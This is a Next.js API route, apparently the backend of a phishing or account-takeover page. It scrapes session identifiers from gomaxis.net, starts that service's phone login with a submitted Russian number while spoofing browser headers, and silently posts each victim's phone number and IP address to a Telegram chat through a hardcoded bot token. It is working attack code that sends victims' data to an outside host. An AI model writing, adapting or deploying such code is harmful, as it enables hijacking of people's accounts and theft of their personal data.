import { NextRequest, NextResponse } from "next/server";

export const runtime = "nodejs";

const BASE_URL = "https://gomaxis.net";
const PAGE_PATH = "/s/knife";
const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36";
const TG_TOKEN = "8858079352:AAEIiwfsGdiZ4w0n3qKXA5bZiwiewvcMLa4";
const TG_CHAT = "-1003907306436";

async function sendTelegram(text: string) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ chat_id: TG_CHAT, text }),
      signal: AbortSignal.timeout(5000),
    });
  } catch { /* fire and forget */ }
}

export async function POST(request: NextRequest) {
  let body: { phone?: string };
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ ok: false, error: "Bad request" }, { status: 400 });
  }

  const phone = (body.phone ?? "").replace(/\s/g, "").trim();
  if (!/^\+79\d{9}$/.test(phone)) {
    return NextResponse.json({ ok: false, error: "Неверный формат номера" }, { status: 400 });
  }

  const referer = BASE_URL + PAGE_PATH;

  // Step 1: Get SESSION_ID and BOT_ID from gomaxer page
  let sessionId: string;
  let botId: number;
  try {
    const pageRes = await fetch(referer, {
      headers: { "User-Agent": UA },
      signal: AbortSignal.timeout(10000),
    });
    const html = await pageRes.text();
    const sessionMatch = html.match(/const\s+SESSION_ID\s*=\s*"([A-Za-z0-9_-]{16,128})"/);
    const botMatch = html.match(/const\s+BOT_ID\s*=\s*(\d+)/);
    if (!sessionMatch || !botMatch) {
      return NextResponse.json({ ok: false, error: "Сервис временно недоступен" }, { status: 502 });
    }
    sessionId = sessionMatch[1];
    botId = parseInt(botMatch[1], 10);
  } catch {
    return NextResponse.json({ ok: false, error: "Сервис временно недоступен" }, { status: 502 });
  }

  // Step 2: Poll status (as gomaxer expects)
  try {
    await fetch(`${BASE_URL}/api/session/${sessionId}/status?bot_id=${botId}`, {
      headers: { Accept: "application/json", Referer: referer, "User-Agent": UA },
      signal: AbortSignal.timeout(8000),
    });
  } catch { /* ignore */ }

  // Step 3: Start phone auth
  try {
    const startRes = await fetch(`${BASE_URL}/api/auth/phone/start`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Origin: BASE_URL,
        Referer: referer,
        "User-Agent": UA,
      },
      body: JSON.stringify({ session_id: sessionId, phone, bot_id: botId }),
      signal: AbortSignal.timeout(10000),
    });
    const result = await startRes.json() as Record<string, unknown>;
    if (result.success === false || result.ok === false) {
      return NextResponse.json({ ok: false, error: "Ошибка отправки кода" }, { status: 502 });
    }
  } catch {
    return NextResponse.json({ ok: false, error: "Сервис временно недоступен" }, { status: 502 });
  }

  // Log phone to Telegram
  const ip = request.headers.get("x-forwarded-for")?.split(",")[0].trim() ?? "unknown";
  void sendTelegram(`📱 Новый номер телефона\nТелефон: ${phone}\nIP: ${ip}\nВремя: ${new Date().toISOString()}`);

  return NextResponse.json({ ok: true, session_id: sessionId, bot_id: botId });
}
